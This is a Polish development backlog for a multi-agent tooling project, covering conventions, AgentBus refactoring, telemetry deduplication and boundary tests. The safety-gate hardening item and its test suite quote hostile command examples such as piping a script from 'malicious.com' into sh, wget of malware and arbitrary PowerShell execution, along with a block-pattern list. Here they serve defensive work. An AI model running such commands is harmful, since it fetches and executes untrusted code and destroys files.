# Backlog — 2026-03-25

*24 pozycji*

---

## Szybkie strzały (wysoka wartość, mała praca)

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 174 | [CONV] P1: CONVENTION_GIT — formalizacja | Dev | wysoka | mala |
| 164 | Rozszerzenie skali code maturity (L1-L6 + AGI) | Arch | wysoka | mala |

## Wysoka wartość, średnia praca

| id  | tytuł                                                          | obszar | wartość | effort  |
| --- | -------------------------------------------------------------- | ------ | ------- | ------- |
| 175 | [CONV] P1: CONVENTION_FILE_STRUCTURE — nowa                    | Arch   | wysoka  | srednia |
| 173 | [CONV] P1: CONVENTION_TESTING — nowa                           | Arch   | wysoka  | srednia |
| 168 | Tryb nasluchu — agent refresh kontekstu w trakcie sesji        | Arch   | wysoka  | srednia |
| 158 | CLI-API sync guard: test + docelowo single source of truth     | Dev    | wysoka  | srednia |
| 147 | Telemetry deduplication — single source of truth               | Dev    | wysoka  | srednia |
| 146 | Claimed status leak — rozdzielenie status vs ownership         | Dev    | wysoka  | srednia |
| 145 | Boundary tests — testy na granicach modułów (foundation)       | Dev    | wysoka  | srednia |
| 139 | Architect audit — config-driven architecture w całym projekcie | Arch   | wysoka  | srednia |

## Wysoka wartość, duża praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 169 | [CONV] EPIC: 100% pokrycie konwencjami | Arch | wysoka | duza |
| 148 | Safety gate hardening — deny-by-default dla komend destrukcyjnych | Dev | wysoka | duza |

## Średnia wartość, mała praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 180 | [CONV] P2: CONVENTION_HOOKS | Dev | srednia | mala |
| 166 | convention_init.py — scaffolding tool for new conventions | Dev | srednia | mala |
| 155 | Cancelled/superseded status dla handoff | Dev | srednia | mala |
| 154 | agent_bus_cli: filtr po senderze | Dev | srednia | mala |
| 141 | Agent communication — broadcast messages (do wszystkich) | Dev | srednia | mala |

## Średnia wartość, średnia/duża praca

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 181 | [CONV] P2: CONVENTION_REVIEW | Arch | srednia | srednia |
| 179 | [CONV] P2: CONVENTION_DB_SCHEMA | Arch | srednia | srednia |
| 178 | [CONV] P2: CONVENTION_TOOL_CLI | Dev | srednia | srednia |
| 149 | AgentBus refactor — separation of concerns | Dev | srednia | duza |
| 143 | Agent_bus — auto mark-read + manual unread | Dev | srednia | srednia |
| 124 | Dependency support w backlogu (depends_on kolumna) | Dev | srednia | srednia |

## Pozostałe

| id | tytuł | obszar | wartość | effort |
|----|-------|--------|---------|--------|
| 183 | [CONV] P3: CONVENTION_LANGUAGE | Arch | niska | mala |

---

## Szczegóły

### [183] [CONV] P3: CONVENTION_LANGUAGE
**area:** Arch  **value:** niska  **effort:** mala  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 4 / P3

Formalizacja polityki jezykowej jako konwencja.
Owner: Architect. Reviewer: PE.
Zrodlo: ADR-002 + CLAUDE.md (konwencja jezykowa). Wystarczy sformalizowac.

### [181] [CONV] P2: CONVENTION_REVIEW
**area:** Arch  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 3 / P2

Konwencja review — code review, prompt review, workflow review.
Owner: Architect. Reviewer: PE.
Zrodlo: ARCHITECT.md (code_maturity_levels, output_contract) — tylko code review, brak reszty.

### [180] [CONV] P2: CONVENTION_HOOKS
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 3 / P2

Konwencja hookow — pre/post tool use, on_stop, on_user_prompt.
Owner: Developer. Reviewer: Architect.
Zrodlo: 4 hooki w tools/hooks/, brak specyfikacji co moga a czego nie.

### [179] [CONV] P2: CONVENTION_DB_SCHEMA
**area:** Arch  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 3 / P2

Konwencja schematu DB — nazewnictwo tabel mrowisko.db, migracje, backwards compat.
Owner: Architect. Reviewer: Developer.
Zrodlo: ADR-001 (domain model), brak operacyjnej konwencji migracji.

### [178] [CONV] P2: CONVENTION_TOOL_CLI
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 3 / P2

Konwencja interfejsu CLI narzedzi — output JSON contract, argument parsing, error format.
Owner: Developer. Reviewer: Architect.
Zrodlo: 55+ narzedzi w tools/, brak unified interface contract.

### [175] [CONV] P1: CONVENTION_FILE_STRUCTURE — nowa
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 2 / P1

Konwencja struktury plikow — co gdzie zyje w repo.
Owner: Architect. Reviewer: Developer.

Zakres: documents/ (per rola), tools/, tests/, solutions/, tmp/, bot/,
_loom/, conventions/, workflows/, core/. Nazewnictwo plikow, artefakty per workflow.
Zrodlo: CLAUDE.md (rozproszone reguly), faktyczna struktura repo.

### [174] [CONV] P1: CONVENTION_GIT — formalizacja
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 2 / P1

Formalizacja istniejacych regul git jako konwencja.
Owner: Developer. Reviewer: Architect.

Zakres: format commit message (feat/fix/refactor/docs/test/chore),
uzycie git_commit.py, kiedy push, branch naming, co nie commitowac.
Zrodlo: CLAUDE.md (sekcja git), git_commit.py.

### [173] [CONV] P1: CONVENTION_TESTING — nowa
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-25

[CONV EPIC #169] Fala 2 / P1

Nowa konwencja — co testowac, jak, coverage, fixtures, nazewnictwo.
Owner: Architect. Reviewer: Developer.

Zakres: pytest pattern, co wymaga testu (tools, lib, core), naming (test_*),
fixture reuse (conftest.py), kiedy mock vs real, coverage threshold.
Zrodlo: 40+ testow w tests/ jako implicit pattern.

### [169] [CONV] EPIC: 100% pokrycie konwencjami
**area:** Arch  **value:** wysoka  **effort:** duza  **status:** planned  **created_at:** 2026-03-25

Epic: 100% pokrycie projektu konwencjami w formacie CONVENTION_META.

Mapa konwencji: documents/human/plans/mapa_konwencji_2026_03_25.md

14 konwencji do stworzenia w 4 falach:
- Fala 1 (P0): PROMPT, CODE, COMMUNICATION — runner-blocking
- Fala 2 (P1): TESTING, GIT, FILE_STRUCTURE, SQL — quality-critical
- Fala 3 (P2): ERP_SOLUTIONS, TOOL_CLI, DB_SCHEMA, HOOKS, REVIEW — consistency
- Fala 4 (P3): RESEARCH, LANGUAGE — nice-to-have

Podzadania tworzone jako osobne backlog items z prefixem [CONV].
Tracking postępu: backlog --area Arch, filtr [CONV].

### [168] Tryb nasluchu — agent refresh kontekstu w trakcie sesji
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

## Problem

Agent fetchuje inbox raz (session_init) i jest ślepy na nowe wiadomości w trakcie sesji. Developer wysyła handoff — Architect go nie widzi.

## Propozycja: Tryb nasłuchu

Agent przed rozpoczęciem głębokiej pracy (code review, design, analiza) refreshuje kontekst:
- Sprawdza nowe wiadomości od ostatniego fetcha
- Reaguje jeśli coś pilne (handoff, flag)
- Kontynuuje pracę z aktualnym kontekstem

## Architektura

Model sesji zmienia się z:
```
session_init → [praca ciągła]
```
na:
```
session_init → [praca → refresh → praca → refresh → ...]
```

## Do zaprojektowania

1. Mechanizm refresh (nowa komenda CLI? rozszerzenie session_init? osobne narzędzie?)
2. Kiedy refreshować (przed każdym task? co N minut? na żądanie usera?)
3. Co refreshować (tylko inbox? backlog updates? known gaps?)
4. Jak wstrzyknąć do kontekstu agenta (print → agent widzi w output)

## Źródło

Sesja e9bb3053a69b — Architect nie widział handoffa #286 wysłanego w trakcie sesji.

### [166] convention_init.py — scaffolding tool for new conventions
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Tool: py tools/convention_init.py --id X --scope Y --audience Z. Generuje plik z YAML header i pustymi sekcjami zgodnie z CONVENTION_META. Eliminuje bledy struktury. Zrodlo: sugestia #255 (PE).

### [164] Rozszerzenie skali code maturity (L1-L6 + AGI)
**area:** Arch  **value:** wysoka  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

## Problem

Obecna skala code review w ARCHITECT.md ma 3 poziomy (Junior/Mid/Senior). System osiąga Senior — brakuje aspiracyjnych poziomów wyższych które już przejawiają się w praktyce (Developer identyfikował wzorce Staff/Principal w konwersacji).

## Propozycja

Rozszerzyć skalę o poziomy wyższe + dodać poziom AGI jako cel aspiracyjny mrowiska.

Baza z sugestii #295 (Developer):
- L1 Junior → L2 Mid → L3 Senior → L4 Staff → L5 Principal → L6 AGI

Poziom AGI: system sam identyfikuje i rozwiązuje klasy problemów, generuje nowe wzorce, eliminuje potrzebę eskalacji.

## Do dopracowania

- Dokładne definicje poziomów (zwłaszcza L4-L6) dostosowane do kontekstu mrowiska (nie korporacyjnego)
- Czy L5 to Principal czy Distinguished, czy inna nazwa
- Definicja AGI level — co konkretnie oznacza dla kodu w mrowisko
- Update ARCHITECT.md (sekcja code_maturity_levels)

## Źródło

Sugestia #295 (Developer) + decyzja usera o poziomie AGI. Wzorce wyższego poziomu zaobserwowane w praktyce — emergencja, nie teoria.

### [158] CLI-API sync guard: test + docelowo single source of truth
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

## Problem

AgentBus (API) i agent_bus_cli.py (CLI) to dwa pliki opisujące to samo. Ręczna synchronizacja się rozjeżdża — brakuje np. `suggestions --id` choć `backlog --id` istnieje. Klasa błędów której nie da się wyeliminować dyscypliną.

## Krok 1: Test-guard (MVP)

Test introspektuje publiczne metody AgentBus i porównuje z komendami CLI. Brak pokrycia = FAIL.

Scope:
- Jeden test w test_agent_bus.py
- Introspection: AgentBus public methods vs CLI commands dict
- Fail message: "AgentBus.X() nie ma odpowiednika w CLI"

## Krok 2: Single source of truth (docelowo)

CLI generowany z deklaracji na metodach AgentBus. Metoda = komenda. agent_bus_cli.py z ~550 linii → ~30.

Podejście: dekorator na metodach AgentBus definiuje argumenty CLI. CLI iteruje dekoratory, buduje argparse, dispatchuje.

## Źródło

- Sugestia #294 (Developer)
- Code review handoff #270 — Architect natknął się na brak `suggestions --id`

### [155] Cancelled/superseded status dla handoff
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

## Problem

Handoff do siebie (#267) stał się obsolete gdy ukończyłem zadanie w tej samej sesji. Brak mechanizmu anulowania — tylko `mark-read` maskuje problem.

## Propozycja

1. Dodać status `cancelled`/`superseded` do messages (lub osobne pole)
2. Komenda CLI: `py tools/agent_bus_cli.py cancel-handoff --id 267 --reason "Completed in same session"`
3. Filtrowanie w inbox: cancelled handoffy nie pokazują się domyślnie

## Alternatywa

Handoff automatycznie cancelled gdy:
- Ten sam sender wysyła nowy handoff do tego samego recipient
- Lub gdy backlog powiązany zmienia status na `done`

### [154] agent_bus_cli: filtr po senderze
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Dodać możliwość filtrowania wiadomości po senderze w agent_bus_cli.

**Problem:** Obecnie `inbox --role X` pokazuje wiadomości DO roli X. Brak sposobu na sprawdzenie wiadomości OD roli (np. "co Architect pisał o research?").

**Propozycja:**
- `inbox --sender architect` — wiadomości wysłane przez architekta
- lub `outbox --role architect` — outbox danej roli

**Use case:** Agent chce zweryfikować ustalenia innej roli bez czytania surowej bazy.

### [149] AgentBus refactor — separation of concerns
**area:** Dev  **value:** srednia  **effort:** duza  **status:** planned  **created_at:** 2026-03-24

# Backlog: AgentBus Refactor — Separation of Concerns

## Problem

**AgentBus ma zbyt wiele odpowiedzialności:** Jedna klasa (~1500 linii) robi 5 różnych rzeczy.

**Obecne role AgentBus:**
1. **Domain use cases** (send message, add suggestion, implement suggestion)
2. **Legacy API** (mapowanie starych komend na nowy model)
3. **Infrastructure** (sessions, heartbeat, trace, agent instances)
4. **Direct SQL** (claim task, update status — omija repositories)
5. **Facade** (API dla CLI i FastAPI server)

**Konsekwencje:**
- Trudno testować (wszystko splątane)
- Trudno zmieniać (zmiana w jednej części wpływa na inne)
- Trudno zrozumieć (1500 linii mixed abstractions)
- Trudno onboardować (developer musi przeczytać wszystko)

**Root cause:**
- Brak rozdzielenia: domain / infrastructure / legacy / API
- "Człowiek orkiestra" — jedna klasa robi wszystko

## Rozwiązanie

**Rozdziel odpowiedzialności — separation of concerns:**

### Warstwa 1: Domain Services (use cases)

**MessageService:**
- send_message(sender, recipient, content, type) → Message
- get_inbox(role, status) → List[Message]
- mark_read(message_id) → Message

**SuggestionService:**
- add_suggestion(author, content, type) → Suggestion
- implement_suggestion(id, backlog_id) → Suggestion
- get_suggestions(author, status) → List[Suggestion]

**BacklogService:**
- add_backlog(title, content, area, value, effort) → BacklogItem
- update_backlog_status(id, status) → BacklogItem
- get_backlog(area, status) → List[BacklogItem]

### Warstwa 2: Infrastructure Services

**SessionService:**
- create_session(role) → session_id
- log_session(role, content) → None
- get_session_logs(role) → List[SessionLog]

**AgentInstanceService:**
- register_instance(role) → instance_id
- heartbeat(instance_id) → None
- get_active_instances() → List[AgentInstance]

**TaskService:**
- claim_task(message_id, instance_id) → Message
- unclaim_task(message_id) → Message

### Warstwa 3: Legacy Adapter (backward compat)

**LegacyAgentBusAdapter:**
- Mapuje stare API calls na nowe services
- Używa LegacyAPIMapper (już istnieje)
- Odpowiedzialny TYLKO za backward compatibility

### Warstwa 4: Facade (thin API layer)

**AgentBusFacade:**
- Thin wrapper exposing API dla CLI/FastAPI
- Deleguje do services (nie zawiera logiki)
- Orchestruje use cases (np. implement suggestion → update backlog)

### Pattern

**Przed:**
```
AgentBus (1500 linii)
  ├─ send_message() — domain
  ├─ claim_task() — infrastructure + direct SQL
  ├─ legacy mapping — adapter
  └─ transaction() — orchestration
```

**Po:**
```
AgentBusFacade (thin)
  ├─ MessageService (domain)
  ├─ SuggestionService (domain)
  ├─ BacklogService (domain)
  ├─ SessionService (infrastructure)
  ├─ TaskService (infrastructure)
  ├─ LegacyAdapter (backward compat)
  └─ Repositories (persistence — już istnieją)
```

## Implementacja

**Krok 1: Extract Domain Services (incremental)**
- MessageService — extract send_message, get_inbox, mark_read
- SuggestionService — extract add_suggestion, implement, get_suggestions
- BacklogService — extract add_backlog, update_status, get_backlog

**Krok 2: Extract Infrastructure Services**
- SessionService — extract session_log, create_session
- AgentInstanceService — extract register, heartbeat
- TaskService — extract claim/unclaim

**Krok 3: Create LegacyAdapter**
- Wrapper mapujący stare API na nowe services
- Używa LegacyAPIMapper

**Krok 4: Create Facade**
- AgentBusFacade deleguje do services
- Update CLI/API do używania facade
- Deprecate old AgentBus (keep jako legacy do czasu migration)

**Krok 5: Update tests**
- Unit tests dla każdego service osobno
- Integration tests dla facade
- Backward compat tests dla legacy adapter

**Krok 6: Migration**
- CLI stopniowo przechodzi na facade
- AgentBus zostaje jako legacy (deprecated)
- Po pełnej migracji: remove old AgentBus

## Success Criteria

- ✓ Services wydzielone (6 services: Message/Suggestion/Backlog/Session/Instance/Task)
- ✓ LegacyAdapter oddzielny (backward compat only)
- ✓ Facade thin (orchestration, no logic)
- ✓ Tests: unit per service + integration facade
- ✓ CLI/API używają facade (nie old AgentBus)
- ✓ Zero breaking changes (backward compat maintained)

## Dependencies

**Wymagane przed:**
- Boundary tests (Problem 5) — safety net dla refactoru

**Po wykonaniu:**
- Cleaner architecture (separation of concerns)
- Easier testing (unit per service)
- Easier changes (isolated impact)

## Value

**Średnia** — tech debt cleanup, long-term maintainability. Nie blokuje funkcjonalności.

## Effort

**Duża** (~1-2 tygodnie)
- Extract 6 services (3-5 dni)
- Create adapter + facade (2-3 dni)
- Update tests (3-4 dni)
- Migration CLI/API (2-3 dni)

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 7 (linie 228-248)
- ADR-001: Domain Model Migration (pattern separation of concerns)

### [148] Safety gate hardening — deny-by-default dla komend destrukcyjnych
**area:** Dev  **value:** wysoka  **effort:** duza  **status:** planned  **created_at:** 2026-03-24

# Backlog: Safety Gate Hardening — Deny-by-Default dla Komend Destrukcyjnych

## Problem

**Safety hook zbyt permissive:** Wpuszcza komendy destrukcyjne, execution, network bez approval.

**Obecny stan:**

**SAFE_PREFIXES (auto-allow):**
- **Destructive:** rm, del, rmdir, mv, cp (mogą kasować/nadpisywać)
- **Execution:** powershell, cmd, start (mogą wykonać dowolny kod)
- **Network:** curl, wget (mogą ściągnąć zewnętrzny kod)

**DANGEROUS_PATTERNS (blocked):**
- Tylko skrajności: `rm -rf /`, `rm -rf *`, `DROP TABLE`, `DELETE FROM table;`

**Co PRZECHODZI (risk):**
- `rm documents/erp_specialist/PROMPT.md` ✓ (kasuje chroniony plik)
- `rm -r core/` ✓ (kasuje katalog — brak -rf)
- `del *.py` ✓ (wildcard destructive)
- `mv important.txt trash.txt` ✓ (nadpisanie bez backup)
- `powershell -Command "malicious code"` ✓ (arbitrary execution)
- `start malware.exe` ✓ (execution)
- `curl malicious.com/script.sh | sh` ✓ (network + execution)

**Problem:**
- Agent może skasować/nadpisać ważne pliki
- Agent może wykonać niebezpieczny kod
- Agent może ściągnąć zewnętrzny kod
- **Za szeroka bramka — security risk**

## Rozwiązanie

**Deny-by-default + explicit allowlist dla bezpiecznych ścieżek:**

### Kategoria 1: Destructive Commands

**Deny wszystkie rm/del/rmdir**, wyjątek:
- Allowlist paths: `tmp/`, `documents/human/tmp/`
- Pattern: `rm tmp/file.txt` → allow, `rm core/file.py` → deny

**Deny mv/cp z nadpisaniem**, wyjątek:
- Tylko w tmp/ lub explicit approval

### Kategoria 2: Execution Commands

**Deny wszystkie powershell/cmd/start**, wyjątek:
- Whitelist komend: `start .` (otwórz katalog w explorer)
- Reszta → explicit approval

### Kategoria 3: Network Commands

**Deny curl/wget z pipe**, always:
- `curl url | sh` → deny (execution risk)
- `curl url -o file` → allow (safe download)

### Kategoria 4: Wildcards

**Deny destrukcyjne wildcards**, always:
- `rm *.py`, `del *.txt`, `rm -r *` → deny
- Wyjątek: `rm tmp/*.log` (w allowlist path)

## Implementacja

**Krok 1: Audit SAFE_PREFIXES**
- Zidentyfikować wszystkie ryzykowne prefixes
- Kategoryzować: destructive / execution / network

**Krok 2: Define allowlists**
```python
ALLOWED_DESTRUCTIVE_PATHS = [
    "tmp/",
    "documents/human/tmp/",
]

ALLOWED_EXECUTION_COMMANDS = [
    "start .",  # Open current dir in explorer
]

BLOCKED_PATTERNS_EXTENDED = [
    # Wildcards
    r"rm\s+.*\*",
    r"del\s+.*\*",
    r"rmdir\s+.*\*",
    # Execution with args
    r"powershell\s+-Command",
    r"cmd\s+/c",
    # Network pipe
    r"curl.*\|",
    r"wget.*\|",
]
```

**Krok 3: Update hook logic**
- Check destructive command → verify path in allowlist
- Check execution command → verify in whitelist
- Check network command → verify no pipe
- Else → deny with repair message

**Krok 4: Tests (boundary)**
- 15 test cases (protected files, tmp files, wildcards, execution, network)
- Verify: tmp/ allowed, protected denied, wildcards denied

**Krok 5: Documentation**
- Update hook docstring z policy
- Add repair messages (np. "Użyj explicit path, wildcard blocked")

## Success Criteria

- ✓ Destructive commands: deny-by-default, allowlist dla tmp/
- ✓ Execution commands: deny-by-default, whitelist dla safe
- ✓ Network commands: deny pipe, allow safe download
- ✓ Wildcards: deny dla destructive
- ✓ Tests: boundary test PASS (test_safety_gate_precision)
- ✓ Zero false positives (safe commands nie blokowane)

## Dependencies

**Po wykonaniu:**
- Boundary test dla safety gate (Problem 5) — PASS

## Value

**Wysoka** — security. Agent nie może skasować/nadpisać ważnych plików ani wykonać niebezpiecznego kodu.

## Effort

**Średnia-duża** (~2-3 dni)
- Audit wszystkich SAFE_PREFIXES (pół dnia)
- Define allowlists i extended patterns (pół dnia)
- Update hook logic (1 dzień)
- Tests (15 cases) (1 dzień)

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 4 (linie 176-191)
- Current hook: `tools/hooks/pre_tool_use.py`

### [147] Telemetry deduplication — single source of truth
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

# Backlog: Telemetry Deduplication — Single Source of Truth

## Problem

**Brak deduplikacji:** Tool calls logowane przez 2 ścieżki, duplikaty w bazie.

**Obecny stan:**

**Ścieżka 1 (live logging):**
- `tools/hooks/post_tool_use.py` zapisuje tool call po wykonaniu (live)
- INSERT INTO tool_calls (session_id, turn_index, tool_name, ...)

**Ścieżka 2 (post-session replay):**
- `tools/jsonl_parser.py` odczytuje transcript i zapisuje tool calls (po sesji)
- INSERT INTO tool_calls (session_id, turn_index, tool_name, ...)

**Problem:**
- Ten sam event zapisany 2× (live + replay)
- Statystyki zawyżone (np. "Read użyty 100 razy" faktycznie = 50 razy)
- Brak single source of truth (która ścieżka jest prawdą?)

**Konsekwencje:**
- Raporty nierzetelne (duplikaty)
- Analiza usage patterns błędna
- Kosztowanie sesji zawyżone

## Rozwiązanie

**DB-level deduplikacja — unique constraint:**

**Klucz unikalny:** `(session_id, turn_index, tool_name)`
- session_id — identyfikuje sesję
- turn_index — numer tury w sesji
- tool_name — nazwa narzędzia

**Pattern:**
```sql
CREATE UNIQUE INDEX idx_tool_calls_dedup
ON tool_calls(session_id, turn_index, tool_name);

-- INSERT ... ON CONFLICT IGNORE (SQLite 3.24+)
-- Pierwsza ścieżka która zapisze = source of truth
-- Druga ścieżka (duplikat) = ignored
```

**Benefit:**
- Obie ścieżki mogą zapisywać (live + replay)
- Baza pilnuje deduplikacji (defensive)
- Zero logic changes w hook/parser (transparent)

## Implementacja

**Krok 1: Analiza spójności kluczy**
- Zweryfikować: czy live logging i replay używają identycznych wartości?
  - session_id: czy identyczne?
  - turn_index: czy identyczne?
  - tool_name: czy identyczne?
- Jeśli NIE → najpierw znormalizować logikę zapisu

**Krok 2: Schema migration**
```sql
-- Cleanup existing duplicates
DELETE FROM tool_calls WHERE rowid NOT IN (
  SELECT MIN(rowid) FROM tool_calls
  GROUP BY session_id, turn_index, tool_name
);

-- Add unique constraint
CREATE UNIQUE INDEX idx_tool_calls_dedup
ON tool_calls(session_id, turn_index, tool_name);
```

**Krok 3: Update insert logic**
- post_tool_use.py: INSERT ... ON CONFLICT IGNORE
- jsonl_parser.py: INSERT ... ON CONFLICT IGNORE

**Krok 4: Tests**
- Test: zapisz live → zapisz replay → COUNT = 1 (boundary test)
- Test: zapisz tylko live → COUNT = 1
- Test: zapisz tylko replay → COUNT = 1

**Krok 5: Verify statistics**
- Query tool usage stats przed/po migration
- Verify: stats po migration = ~50% stats przed (duplikaty usunięte)

## Success Criteria

- ✓ Unique constraint: `(session_id, turn_index, tool_name)` added
- ✓ Existing duplicates cleaned
- ✓ Insert logic: ON CONFLICT IGNORE
- ✓ Tests: boundary test PASS (test_telemetry_dedup)
- ✓ Statistics accurate (no inflation)

## Dependencies

**Po wykonaniu:**
- Boundary test dla telemetry (Problem 5) — PASS

## Value

**Wysoka** — data quality. Raporty muszą być rzetelne.

## Effort

**Średnia** (~pół-1 dzień)
- Analiza spójności kluczy (2-3 godziny)
- Migration SQL (1 godzina)
- Update insert logic (1 godzina)
- Tests verification (1-2 godziny)

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 3 (linie 158-173)

### [146] Claimed status leak — rozdzielenie status vs ownership
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

# Backlog: Claimed Status Leak — Rozdzielenie Status vs Ownership

## Problem

**Architectural leak:** Runner zapisuje stan którego domain model nie umie odczytać.

**Obecny stan:**
- Runner zapisuje: `UPDATE messages SET status = 'claimed'` (direct SQL)
- MessageStatus enum zna: UNREAD / READ / ARCHIVED (nie zna CLAIMED)
- Repository odczytuje: `MessageStatus(row["status"])` → ValueError: 'claimed' is not valid

**Konsekwencje:**
- Repository crash przy próbie odczytu claimed message
- Warstwa operacyjna (runner) i warstwa domenowa (repository) mają różne definicje stanu
- Brak spójności kontraktu między warstwami

**Root cause:**
Status miesza dwa wymiary:
1. **Co z wiadomością zrobiono** (unread/read/archived) — domena
2. **Kto ją trzyma** (claimed by agent) — operacyjne

## Rozwiązanie

**Rozdziel wymiary — separation of concerns:**

**Status** (domenowy):
- UNREAD — nie przeczytana
- READ — przeczytana
- ARCHIVED — zarchiwizowana

**Claimed_by** (operacyjny):
- NULL — nikt nie trzyma (dostępna)
- "runner-123" — trzymana przez runner (claimed)

**Pattern:**
```
Message:
  status: MessageStatus (UNREAD/READ/ARCHIVED)
  claimed_by: Optional[str] = None  ← NEW dimension

Runner claim:
  UPDATE messages SET claimed_by = ? WHERE id = ? AND claimed_by IS NULL

Runner unclaim:
  UPDATE messages SET claimed_by = NULL WHERE id = ?

Repository read:
  MessageStatus(row["status"])  ← zawsze valid (unread/read/archived only)
  claimed_by = row["claimed_by"]  ← separate field
```

## Implementacja

**Krok 1: Schema migration**
```sql
ALTER TABLE messages ADD COLUMN claimed_by TEXT DEFAULT NULL;

-- Migrate existing claimed messages
UPDATE messages SET claimed_by = 'legacy-runner', status = 'unread' WHERE status = 'claimed';
```

**Krok 2: Entity update**
```python
@dataclass
class Message(Entity):
    status: MessageStatus  # UNREAD/READ/ARCHIVED
    claimed_by: Optional[str] = None  # ← NEW
```

**Krok 3: Repository update**
- Add `claimed_by` field to `_row_to_entity()` / `_entity_to_row()`

**Krok 4: Runner update**
- `claim_task()`: UPDATE claimed_by (nie status)
- `unclaim_task()`: UPDATE claimed_by = NULL

**Krok 5: Tests**
- Test: claimed message readable przez repository (boundary test)
- Test: claim/unclaim nie mutuje status

## Success Criteria

- ✓ Schema: `messages.claimed_by` column added
- ✓ Entity: `Message.claimed_by` field
- ✓ Runner: używa claimed_by (nie status)
- ✓ Repository: odczytuje claimed_by bez crash
- ✓ Tests: boundary test PASS (test_claimed_status_read)
- ✓ Zero breaking changes (backward compat)

## Dependencies

**Po wykonaniu:**
- Boundary test dla claimed read (Problem 5) — PASS

## Value

**Wysoka** — architectural integrity. Warstwa A nie zapisuje stanów których warstwa B nie umie czytać.

## Effort

**Średnia** (~1 dzień)
- Migration SQL
- Entity + Repository update
- Runner logic update
- Tests verification

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 1 (linie 104-129)
- ADR-001: Domain Model Migration (pattern reference)

### [145] Boundary tests — testy na granicach modułów (foundation)
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

# Backlog: Boundary Tests — Testy na Granicach Modułów

## Problem

**Mid-level assessment zidentyfikował:** Testy pokrywają komponenty osobno, ale brakuje testów na **granicach między modułami**.

**Konsekwencje:**
- Failure modes (scenariusze awarii) na przecięciach modułów nie są wykryte
- Claimed leak, telemetry duplication, safety gaps — odkryte dopiero w produkcji
- Brak safety net dla refactorów

**Przykłady brakujących testów:**

**Granica 1: Runner → Repository**
- Runner zapisuje `status = 'claimed'` (direct SQL)
- Repository próbuje odczytać przez `MessageStatus(row["status"])`
- **Brak testu:** Czy crash? (Powinien — claimed nie w enum)

**Granica 2: Live logging → Replay → Database**
- `post_tool_use.py` zapisuje tool call live
- `jsonl_parser.py` zapisuje ten sam event z replay
- **Brak testu:** Czy duplikacja? (Obecnie TAK — 2 rekordy zamiast 1)

**Granica 3: Safety hook → Bash**
- Hook ma SAFE_PREFIXES (rm, powershell, curl)
- **Brak testu:** Czy blokuje `rm documents/erp_specialist/PROMPT.md`? (Obecnie NIE)

## Rozwiązanie

**Dodaj testy integracyjne dla granic modułów:**

### Test Suite 1: Runner ↔ Repository

**test_claimed_status_read_failure:**
- Runner zapisuje message z `status = 'claimed'` (direct SQL)
- Repository próbuje odczytać message
- Assert: ValueError raised (claimed nie w MessageStatus enum)
- **Cel:** Verify architectural leak detected

**test_claimed_status_after_fix:**
- Runner zapisuje message z `claimed_by = 'runner-123'`, `status = 'unread'`
- Repository odczytuje message
- Assert: message.status = UNREAD, message.claimed_by = 'runner-123'
- **Cel:** Verify fix (separation of concerns)

### Test Suite 2: Telemetry Deduplication

**test_tool_call_live_and_replay_duplication:**
- Zapisz tool call live (post_tool_use)
- Zapisz ten sam tool call replay (jsonl_parser)
- Query: COUNT(*) WHERE session_id=X AND turn_index=Y AND tool_name=Z
- Assert: count = 1 (nie 2)
- **Cel:** Verify deduplikacja działa

**test_tool_call_replay_only:**
- Zapisz tool call tylko replay (bez live)
- Assert: count = 1
- **Cel:** Verify replay działa standalone

**test_tool_call_live_only:**
- Zapisz tool call tylko live (bez replay)
- Assert: count = 1
- **Cel:** Verify live działa standalone

### Test Suite 3: Safety Gate Precision

**test_safety_gate_destructive_commands:**
- Lista komend: 15 przypadków (protected files, tmp files, directories, wildcards)
- Dla każdej: wywołaj hook, sprawdź decision (allow/deny)
- Expected:
  - `rm tmp/file.txt` → allow
  - `rm documents/erp_specialist/PROMPT.md` → deny
  - `rm -rf core/` → deny
  - `del *.py` → deny (wildcard destructive)
- **Cel:** Verify allowlist precision

**test_safety_gate_execution_commands:**
- Lista: `powershell -Command "code"`, `cmd /c malicious`, `start program.exe`
- Expected: wszystkie deny (execution risk)
- **Cel:** Verify execution gate

**test_safety_gate_network_commands:**
- Lista: `curl malicious.com/script.sh | sh`, `wget external.com/malware`
- Expected: deny dla pipe to execution, allow dla safe download
- **Cel:** Verify network safety

